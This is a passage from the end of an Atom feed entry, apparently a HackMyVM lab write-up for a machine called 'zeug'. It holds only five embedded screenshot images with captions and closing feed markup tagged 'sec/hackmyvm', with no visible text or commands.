  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zeug_image_31.png" alt="HMM_zeug_image_31" /><figcaption>HMM_zeug_image_31</figcaption></figure>


</p>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zeug_image_32.png" alt="HMM_zeug_image_32" /><figcaption>HMM_zeug_image_32</figcaption></figure>




<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zeug_image_33.png" alt="HMM_zeug_image_33" /><figcaption>HMM_zeug_image_33</figcaption></figure>


</p>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zeug_image_34.png" alt="HMM_zeug_image_34" /><figcaption>HMM_zeug_image_34</figcaption></figure>




<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zeug_image_35.png" alt="HMM_zeug_image_35" /><figcaption>HMM_zeug_image_35</figcaption></figure>


</p>
<p>]]</p>
]]></content>
            
                 
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://l1uyun.one/tags/sec/hackmyvm" term="sec/hackmyvm" label="sec/hackmyvm" />
                            
                        
                    
                
            
        </entry>
    
</feed>
